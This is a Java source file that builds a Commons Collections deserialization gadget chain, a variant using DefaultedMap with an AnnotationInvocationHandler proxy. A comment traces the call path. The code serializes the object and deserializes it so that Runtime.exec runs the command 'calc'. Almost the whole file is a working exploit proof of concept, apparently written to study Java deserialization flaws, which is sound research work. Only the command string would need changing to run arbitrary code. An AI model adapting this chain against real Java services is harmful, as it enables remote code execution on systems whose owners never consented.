package cc;
/*
*  ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
                             DefaultedMap.get()
                                ChainedTransformer.transform()
                                     ConstantTransformer.transform()
                                     InvokerTransformer.transform()
                                         Method.invoke()
                                             Class.getMethod()
                                     InvokerTransformer.transform()
                                         Method.invoke()
                                             Runtime.getRuntime()
                                     InvokerTransformer.transform()
                                         Method.invoke()
                                             Runtime.exec()
* */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class DefaultedMapcc {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();

        Map Defaultedmap = DefaultedMap.decorate(hashMap, new ConstantFactory(1));
        Field value = DefaultedMap.class.getDeclaredField("value");
        value.setAccessible(true);
        value.set(Defaultedmap,chainedTransformer);


        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,Defaultedmap);
        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
        Object o = constructor.newInstance(Override.class, proxy);
        SerializableTest.searilze(o,"Defaultedmap.bin");
        SerializableTest.unzearilze("Defaultedmap.bin");
    }
}
